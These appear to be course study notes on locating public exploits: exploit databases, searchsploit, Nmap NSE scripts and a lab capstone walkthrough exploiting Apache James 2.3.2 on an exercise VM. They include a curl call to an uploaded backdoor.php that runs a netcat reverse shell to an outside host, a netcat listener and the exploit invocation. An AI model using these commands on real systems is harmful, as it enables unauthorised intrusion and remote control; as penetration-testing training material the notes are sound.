## 12.2. Online Exploit Resource

### 12.2.1. The Exploit Database

### 12.2.2 Packet Storm

### 12.2.3 GitHub

### 12.2.4 Google Search Operators

## 12.3. Offline Exploit Resources

#### 12.3.1. Exploit Frameworks
- Metasploit
- [Core Impact](https://www.cobaltstrike.com/core-impact/)
- [Canvas](ttp://immunityinc.com/products/canvas/index.html)
- [Browser Exploitation Framework (BeEF)](http://beefproject.com) 

### 12.3.2 SearchSploit

#### Copying the current working directory with searchsploit
```Shell
searchsploit -m windows/remote/48537.py
```
`OR:`
```Shell
searchsploit -m 42031
```
The first command execution copied the exploit file and the second command execution copied the exploit by its EDB-ID.

### 12.3.3. Nmap NSE Scripts

#### Listing NSE scripts containing the word "Exploits"
```Shell
grep Exploits /usr/share/nmap/scripts/*.nse
```

#### Using Nmap NSE to obtain information on a script
```Shell
nmap --script-help=clamav-exec.nse
```
--script-help provides more information on the script

#### Using cURL to URL encode a command for a netcat call back
```Shell
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"
```

### Capstone event

- An exploitable server is running services on several ports on the exercise VM, _PublicExploits03_. Treat this like a real box and start by identifying what services are running on your assigned ports (and your ports only). There is a local user _student_ on this box with the password _lab_. Exploit the vulnerable service and SSH to the box to read _flag.txt_ located in _/home/challenge/_.
#### 1. Nmap scan finds open ports and the name of a service called "Remote Admin 2.3.2"
```Shell
nmap -p- $IP
```

```Shell
nmap -p 22,32822,32823,32824,32825,32826 -sV -sC $IP
```
![[20233507_0835_offsec-locating-public-exploits-nmap.png]]
Remote Admin 2.3.2 was running on port 32822. SMTP is highlighted for later steps. SSH is running on port 32826.
#### 2. Identify associated exploit

Remote Admin 2.3.2 has a public exploit available on Exploit-DB: [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2) - Linux remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/50347)

The code was modified to show the Remote Admin service running on port 32822 and SMTP running on port 32825.

#### 3. Netcat listener started on port 4444
```Shell
nc -lnvp 4444
```

#### 4. Exploit run
```Shell
python3 50347.py 192.168.248.52 192.168.45.241 4444
```

#### 5. Logged into the ssh service with provided creds (student:lab), which gave a reverse shell on netcat
```Shell
ssh student@192.168.248.52 -p 32826
```
![[20235907_0859_exploit-complete.png]]